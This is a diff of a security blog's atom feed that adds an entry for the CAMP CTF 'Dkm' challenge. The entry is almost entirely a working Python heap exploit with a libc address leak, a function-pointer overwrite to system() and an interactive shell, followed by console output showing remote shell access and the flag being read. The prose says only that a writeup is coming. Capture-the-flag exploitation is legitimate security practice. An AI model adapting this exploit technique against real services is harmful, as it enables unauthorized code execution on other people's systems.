@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Heap | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/heap/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-07-25T22:02:43+02:00</updated>
+  <updated>2015-08-18T21:42:50+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,293 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
+    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/"/>
+    <updated>2015-08-18T21:36:14+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm</id>
+    <content type="html"><![CDATA[<p>Writeup coming soon! For now, here&rsquo;s the exploit.</p>
+
+<!--more-->
+
+
+<pre><code class="python">#!/usr/bin/python
+import struct, time
+from socket import *
+
+def q(x):
+    return struct.pack("&lt;Q", x)
+
+def readtil(delim):
+  buf = b''
+  while not delim in buf:
+      buf += s.recv(1)
+  return buf
+
+def add_dkm_without_wifi(comment=""):
+    s.send('2\n')
+    s.send('2\n')
+    s.send('\n')
+    s.send('\n')
+    s.send(comment+'\n')
+
+def add_dkm_with_wifi(comment):
+    s.send('2\n')
+    s.send('1\n')
+    s.send('\n')
+    s.send('\n')
+    s.send('\n')
+    s.send(comment+'\n')
+
+def edit_dkm_without_wifi(id,comment):
+    s.send('4\n')
+    s.send(str(id)+'\n')
+    s.send('2\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send(comment+'\n')
+    #s.send('\n')
+
+def edit_dkm_with_wifi(id,ssid):
+    s.send('4\n')
+    s.send(str(id)+'\n')
+    s.send('1\n')
+    s.send('\n')
+    s.send('\n')
+    s.send('\n')
+    #s.send(ssid+'\n')
+    s.send('\n')
+
+def delete_dkm(id):
+    s.send('3\n')
+    s.send(str(id)+'\n')
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('challs.campctf.ccc.ac', 10102))
+    #s.connect(('localhost', 4444))
+
+    raw_input('dbg')
+
+    readtil('Exit')
+    add_dkm_with_wifi('')
+    print readtil('Exit')
+    print 'adding second wifi'
+    add_dkm_with_wifi('')
+    print readtil('Exit')
+
+    edit_dkm_without_wifi(0, q(0x602040))
+
+    s.send('1\n')
+    readtil('SSID: ')
+    data= s.recv(6)
+
+    data += "\x00\x00"
+    strtoull = (struct.unpack('&lt;Q', data)[0])
+    libc = strtoull - 0x000000000003b1a0 
+
+    print 'libc: %x' % libc
+    system = libc + 0x443d0
+    print 'system: %x' % system
+
+    print readtil('Exit')
+    print 'deleting second wifi'
+    delete_dkm(1)
+    print readtil('Exit')
+    print 'shrinking first wifi'
+    edit_dkm_without_wifi(0,'') # resize it
+    print readtil('Exit')
+    print 'adding second nowifi'
+    add_dkm_without_wifi() # allocate new struct next to old dk
+    print readtil('Exit')
+
+    # edit first struct (now resized) as large struct, so the comment goes into the next chunk's function pointers
+    s.send('4\n')
+    s.send('0\n')
+    s.send('3\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send('1\n')
+    s.send('1\n')
+    #payload = "".join(["%04d" % x for x in range(1023/4)])
+    # ugly padding
+    payload = "AAAA"+"/bin/sh; #"*80+"AAAA"+q(system)
+    s.send(payload+'\n')
+
+    # execute struct-&gt;edit_with_wifi (overwritten with system)
+    s.send('4\n')
+    s.send('1\n')
+    s.send('3\n')   # code exec much?
+
+    import telnetlib
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+    s.close()
+pwn()
+</code></pre>
+
+<p>And against the remote binary:</p>
+
+<pre><code class="bash">ubuntu@ubuntu-VirtualBox:~$ python poc.py 
+dbg
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+adding second wifi
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter a comment for this DK.
+&gt; DK #1 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+libc: 7f912685f000
+system: 7f91268a33d0
+
+ Comment: 
+
+DK #1 with wifi @ 0.0000/0.0000:
+ Comment: 
+
+
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+deleting second wifi
+
+&gt; Enter DK index: 
+&gt; DK #1 successfully deleted.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+shrinking first wifi
+
+&gt; Enter DK index: 
+&gt; Editing DK #0:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully saved.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+adding second nowifi
+
+&gt; Does the DK have wifi?
+1) Yes
+2) No
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter a comment for this DK.
+&gt; DK #1 successfully added.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+
+&gt; Enter DK index: 
+&gt; Editing DK #0:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; Please enter longitude * 10000:
+&gt; Please enter latitude * 10000:
+&gt; Please enter the number of ssids, this DK supports.
+&gt; Please enter the name of SSID #0.
+&gt; Please enter a comment for this DK.
+&gt; DK #0 successfully saved.
+Menu:
+1) List DK's
+2) Add a DK
+3) Remove a DK
+4) Edit a DK
+5) Exit
+&gt; Enter DK index: 
+&gt; Editing DK #1:
+Does the DK have wifi?
+1) Yes
+2) No
+3) Do not change
+&gt; id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+cat flag.txt
+cat: flag.txt: No such file or directory
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd home
+ls
+challenge
+cd cha*
+ls
+challenge
+flag.txt
+cat flag.txt
+CAMP15_aecbde52de8b1ed16bf62aa772d53a2
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
